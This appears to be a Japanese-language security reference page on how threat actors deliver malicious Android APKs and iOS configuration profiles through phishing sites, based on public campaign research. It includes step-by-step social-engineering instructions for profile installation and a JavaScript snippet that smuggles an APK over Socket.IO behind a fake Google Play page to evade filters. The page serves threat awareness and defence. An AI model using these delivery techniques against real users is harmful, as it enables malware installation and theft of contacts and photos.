# Mobile Phishing & Malicious App Distribution (Android & iOS)

> [!INFO]
> このページでは、脅威アクターがフィッシング（SEO、ソーシャルエンジニアリング、偽ストア、dating apps など）を通じて、**悪意のある Android APK** と **iOS mobile-configuration profiles** を配布するために使用する技術を解説します。
> この内容は、Zimperium zLabs（2025）が公開した SarangTrap campaign およびその他の公開調査をもとにしています。<sup>[[1]](#references)</sup>

## 攻撃フロー

1. **SEO/Phishing Infrastructure**
* 数十個の look-alike domains（dating、cloud share、car service など）を登録する。
– `<title>` element に現地語の keywords と emojis を使用して Google でのランキングを上げる。
– 同じ landing page 上で、Android（`.apk`）と iOS の install instructions の両方をホストする。
2. **First Stage Download**
* Android: *unsigned* または “third-party store” APK への直接リンク。
* iOS: 悪意のある **mobileconfig** profile への `itms-services://` または通常の HTTPS link（下記参照）。
3. **Android Post-install Behaviour**
* C2-gated execution、permission abuse、dropper bypasses、background collection、その他の post-install malware behaviour については、下記の専用 Android Malware Post-Exploitation page で解説します。
4. **iOS Delivery Technique**
* 1つの **mobile-configuration profile** で、`PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` などを要求し、デバイスを「MDM」に似た supervision に enroll できます。
* Social-engineering instructions:
1. Settings ➜ *Profile downloaded* を開く。
2. *Install* を3回タップする（phishing page に screenshots を表示）。
3. unsigned profile を trust する ➜ App Store review なしで、攻撃者が *Contacts* と *Photo* entitlement を取得する。
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads により、branded icon/label を付けた phishing URL を **Home Screen に pin** できます。
* Web Clips は **full-screen** で実行でき（browser UI を非表示にする）、**non-removable** としてマークできるため、icon を削除するには victim が profile を削除する必要があります。<sup>[[3]](#references)</sup>
6. **Network Layer**
* Plain HTTP。多くの場合、`api.<phishingdomain>.com` のような HOST header を使用して port 80 で動作します。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLS なし → 簡単に発見できる）。

## Android Malware Post-Exploitation

C2、Accessibility abuse、overlays、ATS automation、staged DEX loading、premium SMS、persistence など、post-install Android malware tradecraft については、以下のページを参照してください。

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + 偽 Google Play Pages

攻撃者は、static APK links を Google Play に似せた lures に埋め込まれた Socket.IO/WebSocket channel に置き換えるケースを増やしています。これにより payload URL を隠し、URL/extension filters を bypass し、現実的な install UX を維持できます。<sup>[[2]](#references)[[4]](#references)</sup>

実際の環境で観測された typical client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

単純な制御を回避する理由:
- 静的な APK URL は公開されず、ペイロードは WebSocket フレームからメモリ上で再構成されます。
- 直接的な .apk レスポンスをブロックする URL/MIME/拡張子フィルターでは、WebSockets/Socket.IO 経由でトンネルされたバイナリデータを見逃す可能性があります。
- WebSockets を実行しないクローラーや URL サンドボックスは、ペイロードを取得できません。

WebSocket の tradecraft とツールについては、以下も参照してください:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Romance の闇: SarangTrap 恐喝キャンペーン](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple デバイス向け Web Clips ペイロード設定](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [インドネシアおよびベトナムの Android ユーザーを標的とする Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
